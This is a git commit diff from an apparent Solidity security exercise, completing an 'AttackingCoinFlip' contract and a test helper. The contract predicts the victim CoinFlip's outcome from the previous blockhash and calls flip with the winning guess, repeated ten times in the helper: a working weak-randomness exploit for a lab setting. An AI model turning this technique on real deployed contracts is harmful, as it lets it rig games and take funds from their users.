91b20237693eeb00a15d962e90bce886f715f3a8
Wilson Lau <hello@wilsonplau.com>
2023-05-21 12:50:19 -0400

    feat: finish CoinFlip

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -5,11 +5,20 @@ import "./CoinFlip.sol";
 contract AttackingCoinFlip {
     address public contractAddress;
 
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
-        // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        if (coinFlip == 1) {
+            CoinFlip(contractAddress).flip(true);
+        } else {
+            CoinFlip(contractAddress).flip(false);
+        }
     }
 }
--- contracts/1. CoinFlip/CoinFlipHelper.ts
+++ contracts/1. CoinFlip/CoinFlipHelper.ts
@@ -1,8 +1,9 @@
-import { expect } from "chai";
-import { ethers } from "hardhat";
-
-const helper = async (victim: any, attacker: any) => {
+const helper = async (_victim: any, attacker: any) => {
   // add code here that will help you pass the test
+  for (let i = 0; i < 10; i++) {
+    const tx = await attacker.hackContract();
+    await tx.wait();
+  }
 };
 
 export default helper;
